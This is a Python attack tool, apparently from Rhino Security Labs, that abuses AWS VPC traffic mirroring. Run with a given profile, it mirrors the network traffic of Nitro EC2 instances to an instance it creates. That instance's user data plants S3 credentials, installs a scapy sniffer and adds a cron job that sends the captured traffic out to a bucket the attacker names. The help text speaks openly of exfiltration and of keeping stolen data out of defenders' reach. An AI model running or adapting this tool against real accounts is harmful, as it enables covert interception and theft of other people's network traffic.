#!/usr/bin/env python3
import boto3
import sys
import argparse
import random
import string

from botocore.exceptions import ProfileNotFound


# https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-types.html#ec2-nitro-instances
NITRO_INSTANCES = [
    'a1', 'c5', 'c5d', 'c5n', 'i3en', 'm5', 'm5a', 'm5ad', 'm5d', 'p3dn.24xlarge',
    'r5', 'r5a', 'r5ad', 'r5d', 't3', 't3a', 'z1d' 'c5.metal', 'c5n.metal', 'i3.metal',
    'i3en.metal', 'm5.metal', 'm5d.metal', 'r5.metal', 'r5d.metal', 'u-6tb1.metal',
    'u-9tb1.metal', 'u-12tb1.metal', 'z1d.metal'
]

# Ubuntu Server 18.04 LTS (HVM), SSD Volume Type in each region
region_to_ami_map = {
    'us-east-1': 'ami-07d0cf3af28718ef8',
    'us-east-2': 'ami-05c1fa8df71875112',
    'us-west-1': 'ami-08fd8ae3806f09a08',
    'us-west-2': 'ami-06f2f779464715dc5',
    # 'ap-east-1': '',
    'ap-south-1': 'ami-009110a2bf8d7dd0a',
    'ap-northeast-2': 'ami-0fd02cb7da42ee5e0',
    'ap-southeast-1': 'ami-03b6f27628a4569c8',
    'ap-southeast-2': 'ami-0edcec072887c2caa',
    'ap-northeast-1': 'ami-0eeb679d57500a06c',
    'ca-central-1': 'ami-0d0eaed20348a3389',
    'eu-central-1': 'ami-0ac05733838eabc06',
    'eu-west-1': 'ami-06358f49b5839867c',
    'eu-west-2': 'ami-077a5b1762a2dde35',
    'eu-west-3': 'ami-0ad37dbbe571ce2a1',
    'eu-north-1': 'ami-ada823d3',
    # 'me-south-1': '',
    'sa-east-1': 'ami-02a3447be1ec3a38f',
}


def main(args):
    region = get_ec2_regions(args.region)

    if not args.profile:
        session = boto3.Session()
        print('No AWS CLI profile passed in, choose one below or rerun the script using the -p/--profile argument:')
        profiles = session.available_profiles
        for i in range(0, len(profiles)):
            print(f'[{i}] {profiles[i]}')
        profile_number = int(input('Choose a profile (Ctrl+C to exit): ').strip())
        profile_name = profiles[profile_number]
        session = boto3.Session(profile_name=profile_name)
    else:
        try:
            profile_name = args.profile
            session = boto3.Session(profile_name=profile_name)
        except ProfileNotFound as error:
            print(f'Did not find the specified AWS CLI profile: {args.profile}\n')

            session = boto3.Session()
            print(f'Profiles that are available: {session.available_profiles}\n')
            print('Quitting...\n')
            sys.exit(1)

    s3_credentials = boto3.Session(profile_name=args.s3_profile).get_credentials()
    s3_aws_cli_profile_text = f"""[default]
aws_access_key_id={s3_credentials.access_key}
aws_secret_access_key={s3_credentials.secret_key}

"""

    ec2_instances = get_ec2_instances_by_region(session, region)

    instances_running_nitro = []
    for instance in ec2_instances:
        if is_nitro_instance(instance):
            instances_running_nitro.append(instance)

    if len(instances_running_nitro) == 0:
        print(f'No instances found in {region} that support VPC traffic mirroring. Exiting...')
        sys.exit(1)

    print(f'Nitro instances found: {len(instances_running_nitro)}')

    if args.vpc_id:
        target_vpc_id = args.vpc_id.lower()
    else:
        target_vpc_id = instances_running_nitro[0]['VpcId']
    print(f'Using VPC: {target_vpc_id}')

    mirror_target_sg_id = create_mirror_target_sg(session, region, target_vpc_id)
    print(f'Mirror target security group: {mirror_target_sg_id}')

    target_eni_id = start_mirror_target_instance(session, region, mirror_target_sg_id, args.bucket, s3_aws_cli_profile_text)
    print(f'Mirror target ENI: {target_eni_id}')

    mirror_target_id = create_mirror_target(session, region, target_eni_id)
    print(f'Mirror target: {mirror_target_id}')

    mirror_filter_id = create_mirror_filter(session, region)
    print(f'Mirror filter: {mirror_filter_id}')

    for instance in instances_running_nitro:
        if instance['VpcId'] == target_vpc_id:
            mirror_session_id = create_mirror_session(session, region, mirror_target_id, mirror_filter_id, instance)
            print(f'Mirror session for instance {instance["InstanceId"]}: {mirror_session_id}')


def create_mirror_session(session, region, mirror_target_id, mirror_filter_id, instance):
    ec2_client = session.client('ec2', region_name=region)

    return ec2_client.create_traffic_mirror_session(
        NetworkInterfaceId=instance['NetworkInterfaces'][0]['NetworkInterfaceId'],
        TrafficMirrorTargetId=mirror_target_id,
        TrafficMirrorFilterId=mirror_filter_id,
        SessionNumber=1
    )['TrafficMirrorSession']['TrafficMirrorSessionId']


# If a region is passed in, return it if EC2 is supported
# If no region is passed in, return all EC2 regions
def get_ec2_regions(region=None):
    session = boto3.Session(profile_name=None)
    supported_regions = session.get_available_regions('ec2')
    if not region:
        return supported_regions
    elif region in supported_regions:
        return region
    else:
        print(f'EC2 is not supported in region {region}.\nYou must choose one from the following supported regions:')
        for supported_region in supported_regions:
            print(f'  - {supported_region}')
        print('\nNote: If the supported region list looks incorrect, you may need to update your boto3/botocore Python libraries (pip3 install --upgrade boto3 botocore)')
        sys.exit(1)


def get_ec2_instances_by_region(session, region):
    ec2_client = session.client('ec2', region_name=region)

    instances = []

    response = ec2_client.describe_instances(MaxResults=1000)

    for reservation in response['Reservations']:
        instances.extend(reservation['Instances'])

    while response.get('NextToken'):
        response = ec2_client.describe_instances(
            NextToken=response.get('NextToken'),
            MaxResults=1000
        )

        for reservation in response['Reservations']:
            instances.extend(reservation['Instances'])

    return instances


# Only Nitro instances support traffic mirroring
# This might not work like I think it does
def is_nitro_instance(instance):
    instance_type = instance['InstanceType']
    for nitro_type in NITRO_INSTANCES:
        if nitro_type in instance_type:
            return True

    return False


def start_mirror_target_instance(session, region, mirror_target_sg_id, s3_bucket, s3_aws_cli_profile_text):
    ec2_client = session.client('ec2', region_name=region)

    with open('./sniff.py', 'r') as f:
        scapy_script = f.read()

    user_data_script = '#!/bin/bash'
    python_command = f'python3 /tmp/sniff.py {s3_bucket}'

    user_data_script += f'\napt update\napt install awscli python3-pip -y\npip3 install psutil scapy\nmkdir /tmp/sniff /root/.aws\necho "{s3_aws_cli_profile_text}" > /root/.aws/credentials'

    user_data_script += f'\necho "{scapy_script}" > /tmp/sniff.py\necho "* * * * * root flock -n /tmp/sniff.lock -c \'{python_command}\'" >> /etc/crontab'

    response = ec2_client.run_instances(
        ImageId=region_to_ami_map[region],
        InstanceType='t3.xlarge',
        MinCount=1,
        MaxCount=1,
        SecurityGroupIds=[
            mirror_target_sg_id
        ],
        UserData=user_data_script
    )

    return response['Instances'][0]['NetworkInterfaces'][0]['NetworkInterfaceId']


def create_mirror_target(session, region, target_eni_id):
    ec2_client = session.client('ec2', region_name=region)

    return ec2_client.create_traffic_mirror_target(
        NetworkInterfaceId=target_eni_id
    )['TrafficMirrorTarget']['TrafficMirrorTargetId']


def create_mirror_filter(session, region):
    ec2_client = session.client('ec2', region_name=region)

    filter_id = ec2_client.create_traffic_mirror_filter()['TrafficMirrorFilter']['TrafficMirrorFilterId']

    ec2_client.create_traffic_mirror_filter_rule(
        TrafficMirrorFilterId=filter_id,
        TrafficDirection='ingress',
        RuleNumber=1,
        RuleAction='accept',
        DestinationCidrBlock='0.0.0.0/0',
        SourceCidrBlock='0.0.0.0/0'
    )

    ec2_client.create_traffic_mirror_filter_rule(
        TrafficMirrorFilterId=filter_id,
        TrafficDirection='egress',
        RuleNumber=1,
        RuleAction='accept',
        DestinationCidrBlock='0.0.0.0/0',
        SourceCidrBlock='0.0.0.0/0'
    )

    return filter_id


def create_mirror_target_sg(session, region, target_vpc_id):
    ec2_client = session.client('ec2', region_name=region)

    sg_id = ec2_client.create_security_group(
        GroupName=random_string(),
        Description=random_string(),
        VpcId=target_vpc_id
    )['GroupId']

    ec2_client.authorize_security_group_ingress(
        GroupId=sg_id,
        IpPermissions=[
            {
                'FromPort': 4789,
                'ToPort': 4789,
                'IpProtocol': 'udp',
                'IpRanges': [
                    {
                        'CidrIp': '10.0.0.0/8'
                    },
                    {
                        'CidrIp': '172.16.0.0/12'
                    },
                    {
                        'CidrIp': '192.168.0.0/16'
                    }
                ]
            }
        ]
    )

    return sg_id


def random_string(length=10, charset=string.ascii_lowercase):
    return ''.join(random.choice(charset) for i in range(length))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='This script will deploy VPC traffic mirroring infrastructure into an AWS account to begin monitoring network traffic within that VPC. The traffic will be mirrored to an EC2 instance that is created and that EC2 instance will exfiltrate the traffic to an S3 bucket that you specify. For more information, read the blog post here: https://rhinosecuritylabs.com/aws/abusing-vpc-traffic-mirroring-in-aws')

    parser.add_argument('-p', '--profile', required=False, default=None, help='The AWS CLI profile to use for making API calls to deploy the mirror infrastructure. This is usually stored under ~/.aws/credentials. You will be prompted by default.')
    parser.add_argument('-s', '--s3-profile', required=True, help='The AWS CLI profile to use for uploading the captured network traffic to the S3 bucket that you pass into -b/--bucket. NOTE: Credentials will be passed to the mirror target EC2 instance so they will be available to any defenders checking out your instance locally or checking the User Data. For this reason, ONLY grant the user the s3:PutObject permission on your specific bucket (and no others) and consider enabling object versioning in your S3 bucket so that someone who finds the keys cannot overwrite the data you have already exfiltrated (because the files have predictable names). NOTE: This should be an IAM user, not an IAM role, because the credentials need to be long lasting.')
    parser.add_argument('-r', '--region', required=True, help='The AWS region to deploy the mirroring infrastructure to.')
    parser.add_argument('-b', '--bucket', required=True, help='The S3 bucket to exfil the network traffic to every hour. It should allow the world to put objects into it.')
    parser.add_argument('-v', '--vpc-id', required=False, default=None, help='The VPC to start mirroring traffic in. If there are no targetable EC2 instances in that VPC, the script will exit early (before doing much). If this argument is not supplied, a VPC will basically be chosen at random. All the EC2 instances in the selected region will be enumerated and the VPC that the first Nitro-based instance is found in will be targeted.')

    args = parser.parse_args()
    main(args)
